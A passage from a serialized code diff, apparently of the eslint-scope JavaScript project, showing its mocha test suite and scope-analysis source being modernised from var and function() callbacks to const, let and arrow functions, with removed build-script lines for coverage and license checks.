analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""Pattern with default values in var in ForInStatement""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""Pattern with default values in let in ForInStatement""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""Pattern with nested default values in var in ForInStatement""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""Pattern with nested default values in let in ForInStatement""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""Pattern with default values in var in ForInStatement (separate declarations)""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""Pattern with default values in var in ForInStatement (separate declarations and with MemberExpression)""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""ArrayPattern in var""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""SpreadElement in var""<c> () => {<\n>+        let scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""ObjectPattern in var""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""complex pattern in var""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""ArrayPattern in AssignmentExpression""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scope.implicit.left.map(left => left.identifier.name)).to.deep.equal([<\n>+    it(""ArrayPattern with MemberExpression in AssignmentExpression""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""SpreadElement in AssignmentExpression""<c> () => {<\n>+        let scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scope.implicit.left.map(left => left.identifier.name)).to.deep.equal([<\n>+        scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scope.implicit.left.map(left => left.identifier.name)).to.deep.equal([<\n>+    it(""SpreadElement with MemberExpression in AssignmentExpression""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scope.implicit.left.map(left => left.identifier.name)).to.deep.equal([<\n>+    it(""ObjectPattern in AssignmentExpression""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scope.implicit.left.map(left => left.identifier.name)).to.deep.equal([<\n>+    it(""complex pattern in AssignmentExpression""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scope.implicit.left.map(left => left.identifier.name)).to.deep.equal([<\n>+    it(""ArrayPattern in parameters""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""SpreadElement in parameters""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""ObjectPattern in parameters""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""complex pattern in parameters""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""default values and patterns in var""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""default values containing references and patterns in var""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""nested default values containing references and patterns in var""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""export declaration""<c> () => {<\n>+    it(""should create vairable bindings""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should create function declaration bindings""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should export function expression""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should export literal""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should refer exported references#1""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should refer exported references#2""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should not refer exported references from other source#1""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should not refer exported references from other source#2""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should not refer exported references from other source#3""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+describe(""import declaration""<c> () => {<\n>+    it(""should import names from source""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should import namespaces""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should import insided names#1""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+    it(""should import insided names#2""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> sourceType: ""module"" });<\n>+describe(""ES6 iteration scope""<c> () => {<\n>+    it(""let materialize iteration scope for ForInStatement#1""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""let materialize iteration scope for ForInStatement#2""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""let materialize iteration scope for ForStatement#2""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 new.target""<c> () => {<\n>+    it(""should not make references of new.target""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 object""<c> () => {<\n>+    it(""method definition""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""computed property key may refer variables""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 rest arguments""<c> () => {<\n>+    it(""materialize rest argument in scope""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 super""<c> () => {<\n>+    it(""is not handled as reference""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 switch""<c> () => {<\n>+    it(""materialize scope""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 template literal""<c> () => {<\n>+    it(""refer variables""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""fallback option""<c> () => {<\n>+    it(""should raise an error when it encountered an unknown node if no fallback.""<c> () => {<\n>+        expect(() => {<\n>+            analyze(ast<c> { fallback: ""none"" });<\n>+    it(""should not raise an error even if it encountered an unknown node when fallback is iteration.""<c> () => {<\n>+        analyze(ast<c> { fallback: ""iteration"" });<\n>+    it(""should not raise an error even if it encountered an unknown node when fallback is a function.""<c> () => {<\n>+        analyze(ast<c> { fallback: node => Object.keys(node) });<\n>+describe(""function name""<c> () => {<\n>+    it(""should create its special scope""<c> () => {<\n>+describe(""ScopeManager.prototype.getDeclaredVariables""<c> () => {<\n>+    it(""should get variables that declared on `VariableDeclaration`""<c> () => {<\n>+    it(""should get variables that declared on `VariableDeclaration` in for-in/of""<c> () => {<\n>+    it(""should get variables that declared on `VariableDeclarator`""<c> () => {<\n>+    it(""should get variables that declared on `FunctionDeclaration`""<c> () => {<\n>+    it(""should get variables that declared on `FunctionExpression`""<c> () => {<\n>+    it(""should get variables that declared on `ArrowFunctionExpression`""<c> () => {<\n>+    it(""should get variables that declared on `ClassDeclaration`""<c> () => {<\n>+    it(""should get variables that declared on `ClassExpression`""<c> () => {<\n>+    it(""should get variables that declared on `CatchClause`""<c> () => {<\n>+    it(""should get variables that declared on `ImportDeclaration`""<c> () => {<\n>+    it(""should get variables that declared on `ImportSpecifier`""<c> () => {<\n>+    it(""should get variables that declared on `ImportDefaultSpecifier`""<c> () => {<\n>+    it(""should get variables that declared on `ImportNamespaceSpecifier`""<c> () => {<\n>+    it(""should not get duplicate even if it's declared twice""<c> () => {<\n>+describe(""global increment""<c> () => {<\n>+    it(""becomes read/write""<c> () => {<\n>+describe(""implicit global reference""<c> () => {<\n>+    it(""assignments global scope""<c> () => {<\n>+    it(""assignments global scope without definition""<c> () => {<\n>+    it(""assignments global scope without definition eval""<c> () => {<\n>+    it(""assignment leaks""<c> () => {<\n>+    it(""assignment doesn't leak""<c> () => {<\n>+    it(""for-in-statement leaks""<c> () => {<\n>+    it(""for-in-statement doesn't leaks""<c> () => {<\n>+describe(""impliedStrict option""<c> () => {<\n>+    it(""ensures all user scopes are strict if ecmaVersion >= 5""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 5<c> impliedStrict: true });<\n>+    it(""ensures impliedStrict option is only effective when ecmaVersion option >= 5""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 3<c> impliedStrict: true });<\n>+    it(""omits a nodejs global scope when ensuring all user scopes are strict""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 5<c> nodejsScope: true<c> impliedStrict: true });<\n>+    it(""omits a module global scope when ensuring all user scopes are strict""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> impliedStrict: true<c> sourceType: ""module"" });<\n>+describe(""label""<c> () => {<\n>+    it(""should not create variables""<c> () => {<\n>+    it(""should count child node references""<c> () => {<\n>+describe(""nodejsScope option""<c> () => {<\n>+    it(""creates a function scope following the global scope immediately""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> nodejsScope: true });<\n>+    it(""creates a function scope following the global scope immediately and creates module scope""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6<c> nodejsScope: true<c> sourceType: ""module"" });<\n>+describe(""object expression""<c> () => {<\n>+    it(""doesn't require property type""<c> () => {<\n>+describe(""optimistic""<c> () => {<\n>+    it(""direct call to eval""<c> () => {<\n>+        const scopes = analyze(ast<c> { optimistic: true }).scopes;<\n>+    it(""with statement""<c> () => {<\n>+        const scopes = analyze(ast<c> { optimistic: true }).scopes;<\n>+describe(""References:""<c> () => {<\n>+    describe(""When there is a `let` declaration on global<c>""<c> () => {<\n>+        it(""the reference on global should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        it(""the reference in functions should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        it(""the reference in default parameters should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""When there is a `const` declaration on global<c>""<c> () => {<\n>+        it(""the reference on global should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        it(""the reference in functions should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""When there is a `var` declaration on global<c>""<c> () => {<\n>+        it(""the reference on global should NOT be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        it(""the reference in functions should NOT be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""When there is a `function` declaration on global<c>""<c> () => {<\n>+        it(""the reference on global should NOT be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        it(""the reference in functions should NOT be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""When there is a `class` declaration on global<c>""<c> () => {<\n>+        it(""the reference on global should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        it(""the reference in functions should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""When there is a `let` declaration in functions<c>""<c> () => {<\n>+        it(""the reference on the function should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        it(""the reference in nested functions should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""When there is a `var` declaration in functions<c>""<c> () => {<\n>+        it(""the reference on the function should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        it(""the reference in nested functions should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""When there is a `let` declaration with destructuring assignment""<c> () => {<\n>+        it(""\""let [a] = [1];\""<c> the reference should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        it(""\""let {a} = {a: 1};\""<c> the reference should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        it(""\""let {a: {a}} = {a: {a: 1}};\""<c> the reference should be resolved.""<c> () => {<\n>+            const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""Reference.init should be a boolean value of whether it is one to initialize or not.""<c> () => {<\n>+            it(`""${code}""<c> all references should be true.`<c> () => {<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+            it(`""${code}""<c> all references should be false.`<c> () => {<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+            it(`""${code}""<c> readonly references of ""a"" should be undefined.`<c> () => {<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""with""<c> () => {<\n>+    it(""creates scope""<c> () => {<\n>","-    MOCHA = NODE_MODULES + ""mocha/bin/_mocha ""<c><\n>-    var errors = 0<c><\n>-    var errors = 0<c><\n>-        lastReturn;<\n>-    lastReturn = exec(`${ISTANBUL} cover ${MOCHA} -- -R progress -c ${TEST_FILES}`);<\n>-     * @param  {object}  dependency object containing the name and licenses of the given dependency<\n>-        var licenses = dependency.licenses;<\n>-            return licenses.some(function(license) {<\n>-                return isPermissible({<\n>-                    name: dependency.name<c><\n>-                    licenses: license<\n>-                });<\n>-            });<\n>-        return OPEN_SOURCE_LICENSES.some(function(license) {<\n>-            return license.test(licenses);<\n>-        });<\n>-    }<c> function(deps) {<\n>-        var impermissible = Object.keys(deps).map(function(dependency) {<\n>-            return {<\n>-                name: dependency<c><\n>-                licenses: deps[dependency].licenses<\n>-            };<\n>-        }).filter(function(dependency) {<\n>-            return !isPermissible(dependency);<\n>-        });<\n>-            impermissible.forEach(function(dependency) {<\n>-    var key<c> val;<\n>-    for (key in override) {<\n>-            val = override[key];<\n>-    var scopeManager<c> referencer<c> options;<\n>-    options = updateDeeply(defaultOptions()<c> providedOptions);<\n>-    scopeManager = new ScopeManager(options);<\n>-    referencer = new Referencer(options<c> scopeManager);<\n>-        var nodeType = node.type;<\n>-        var i<c> iz<c> element;<\n>-        for (i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>-            element = pattern.elements[i];<\n>-    var visitor = new PatternVisitor(options<c> rootPattern<c> callback);<\n>-        this.referencer.visitPattern(id<c> (pattern) => {<\n>-        let local = (node.local || node.id);<\n>-        let local = (node.local || node.id);<\n>-        let local = (node.local || node.id);<\n>-        var previous = this.isInnerMethodDefinition;<\n>-        var letOrConstDecl;<\n>-        letOrConstDecl = node.left;<\n>-        this.visitPattern(letOrConstDecl.declarations[0].id<c> (pattern) => {<\n>-            options = {processRightHandNodes: false};<\n>-        var i<c> iz;<\n>-            this.visitPattern(node.params[i]<c> {processRightHandNodes: true}<c> visitPatternCallback);<\n>-            }<c> (pattern) => {<\n>-        var previous<c> isMethodDefinition;<\n>-        isMethodDefinition = node.type === Syntax.MethodDefinition;<\n>-                this.visitPattern(node.left.declarations[0].id<c> (pattern) => {<\n>-                this.visitPattern(node.left<c> {processRightHandNodes: true}<c> (pattern<c> info) => {<\n>-                    var maybeImplicitGlobal = null;<\n>-                            pattern: pattern<c><\n>-                            node: node<\n>-        var decl<c> init;<\n>-        decl = node.declarations[index];<\n>-        init = decl.init;<\n>-        this.visitPattern(decl.id<c> {processRightHandNodes: !fromTDZ}<c> (pattern<c> info) => {<\n>-                this.visitPattern(node.left<c> {processRightHandNodes: true}<c> (pattern<c> info) => {<\n>-                    var maybeImplicitGlobal = null;<\n>-                            pattern: pattern<c><\n>-                            node: node<\n>-        this.visitPattern(node.param<c> {processRightHandNodes: true}<c> (pattern<c> info) => {<\n>-    BreakStatement() {}<\n>-    ContinueStatement() {}<\n>-        var variableTargetScope<c> i<c> iz<c> decl;<\n>-        variableTargetScope = (node.kind === ""var"") ? this.currentScope().variableScope : this.currentScope();<\n>-        for (i = 0<c> iz = node.declarations.length; i < iz; ++i) {<\n>-            decl = node.declarations[i];<\n>-        var i<c> iz;<\n>-        for (i = 0<c> iz = node.cases.length; i < iz; ++i) {<\n>-        var importer;<\n>-        importer = new Importer(node<c> this);<\n>-        let local = (node.id || node.local);<\n>-    MetaProperty() {<\n>-        var scopes<c> scope<c> i<c> iz;<\n>-        scopes = this.__get(node);<\n>-            for (i = scopes.length - 1; i >= 0; --i) {<\n>-                scope = scopes[i];<\n>-            for (i = 0<c> iz = scopes.length; i < iz; ++i) {<\n>-                scope = scopes[i];<\n>-        var scopes<c> scope;<\n>-        scopes = this.__get(node);<\n>-            scope = scopes[0].upper;<\n>-    attach() { }<\n>-    detach() { }<\n>-    var body<c> i<c> iz<c> stmt<c> expr;<\n>-        for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>-            stmt = body.body[i];<\n>-        for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>-            stmt = body.body[i];<\n>-            expr = stmt.expression;<\n>-    var scopes;<\n>-    scopes = scopeManager.__nodeToScope.get(scope.block);<\n>-        scopeManager.__nodeToScope.set(scope.block<c> [ scope ]);<\n>-        var name = ref.identifier.name;<\n>-        var variable = this.set.get(name);<\n>-        var defs = variable.defs;<\n>-        var closeRef;<\n>-            let ref = this.__left[i];<\n>-        var variable<c> name;<\n>-        name = ref.identifier.name;<\n>-            variable = this.set.get(name);<\n>-        var variables = this.__declaredVariables.get(node);<\n>-        var variable;<\n>-        let ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal<c> !!partial<c> !!init);<\n>-        var current;<\n>-        current = this;<\n>-        var ref<c> i<c> iz;<\n>-    isArgumentsMaterialized() {<\n>-    isThisMaterialized() {<\n>-        for (var i = 0<c> iz = this.through.length; i < iz; ++i) {<\n>-        let implicit = [];<\n>-            let ref = this.__left[i];<\n>-            let info = implicit[i];<\n>-            let ref = this.__left[i];<\n>-        let variable = this.set.get(""arguments"");<\n>-    ""eslint-config-eslint"": ""^3.0.0""<c><\n>-describe(""arguments""<c> function() {<\n>-    it(""arguments are correctly materialized""<c> function() {<\n>-describe(""catch""<c> function() {<\n>-    it(""creates scope""<c> function() {<\n>-describe(""childVisitorKeys option""<c> function() {<\n>-    it(""should handle as a known node if the childVisitorKeys option was given.""<c> function() {<\n>-    it(""should not visit to properties which are not given.""<c> function() {<\n>-        var result = analyze(<\n>-    it(""should visit to given properties.""<c> function() {<\n>-        var result = analyze(<\n>-describe(""ES6 arrow function expression""<c> function() {<\n>-    it(""materialize scope for arrow function expression""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""generate bindings for parameters""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 block scope""<c> function() {<\n>-    it(""let is materialized in ES6 block scope#1""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""let is materialized in ES6 block scope#2""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""function delaration is materialized in ES6 block scope""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""let is not hoistable#1""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""let is not hoistable#2""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 catch""<c> function() {<\n>-    it(""takes binding pattern""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 class""<c> function() {<\n>-    it(""declaration name creates class scope""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""expression name creates class scope#1""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""expression name creates class scope#2""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""computed property key may refer variables""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""regression #49""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 default parameters:""<c> function() {<\n>-    describe(""a default parameter creates a writable reference for its initialization:""<c> function() {<\n>-            it(name<c> function() {<\n>-                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""a default parameter creates a readable reference for references in right:""<c> function() {<\n>-            it(name<c> function() {<\n>-                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""a default parameter creates a readable reference for references in right (for const):""<c> function() {<\n>-            it(name<c> function() {<\n>-                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""a default parameter creates a readable reference for references in right (partial):""<c> function() {<\n>-            it(name<c> function() {<\n>-                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    describe(""a default parameter creates a readable reference for references in right's nested scope:""<c> function() {<\n>-            it(name<c> function() {<\n>-                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 destructuring assignments""<c> function() {<\n>-    it(""Pattern in var in ForInStatement""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""Pattern in let in ForInStatement""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""Pattern with default values in var in ForInStatement""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""Pattern with default values in let in ForInStatement""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""Pattern with nested default values in var in ForInStatement""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""Pattern with nested default values in let in ForInStatement""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""Pattern with default values in var in ForInStatement (separate declarations)""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""Pattern with default values in var in ForInStatement (separate declarations and with MemberExpression)""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""ArrayPattern in var""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""SpreadElement in var""<c> function() {<\n>-        let scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""ObjectPattern in var""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""complex pattern in var""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""ArrayPattern in AssignmentExpression""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>-    it(""ArrayPattern with MemberExpression in AssignmentExpression""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""SpreadElement in AssignmentExpression""<c> function() {<\n>-        let scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>-        scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>-    it(""SpreadElement with MemberExpression in AssignmentExpression""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>-    it(""ObjectPattern in AssignmentExpression""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>-    it(""complex pattern in AssignmentExpression""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>-    it(""ArrayPattern in parameters""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""SpreadElement in parameters""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""ObjectPattern in parameters""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""complex pattern in parameters""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""default values and patterns in var""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""default values containing references and patterns in var""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""nested default values containing references and patterns in var""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""export declaration""<c> function() {<\n>-    it(""should create vairable bindings""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should create function declaration bindings""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should export function expression""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should export literal""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should refer exported references#1""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should refer exported references#2""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should not refer exported references from other source#1""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should not refer exported references from other source#2""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should not refer exported references from other source#3""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-describe(""import declaration""<c> function() {<\n>-    it(""should import names from source""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should import namespaces""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should import insided names#1""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-    it(""should import insided names#2""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>-describe(""ES6 iteration scope""<c> function() {<\n>-    it(""let materialize iteration scope for ForInStatement#1""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""let materialize iteration scope for ForInStatement#2""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""let materialize iteration scope for ForStatement#2""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 new.target""<c> function() {<\n>-    it(""should not make references of new.target""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 object""<c> function() {<\n>-    it(""method definition""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-    it(""computed property key may refer variables""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 rest arguments""<c> function() {<\n>-    it(""materialize rest argument in scope""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 super""<c> function() {<\n>-    it(""is not handled as reference""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 switch""<c> function() {<\n>-    it(""materialize scope""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""ES6 template literal""<c> function() {<\n>-    it(""refer variables""<c> function() {<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-describe(""fallback option""<c> function() {<\n>-    it(""should raise an error when it encountered an unknown node if no 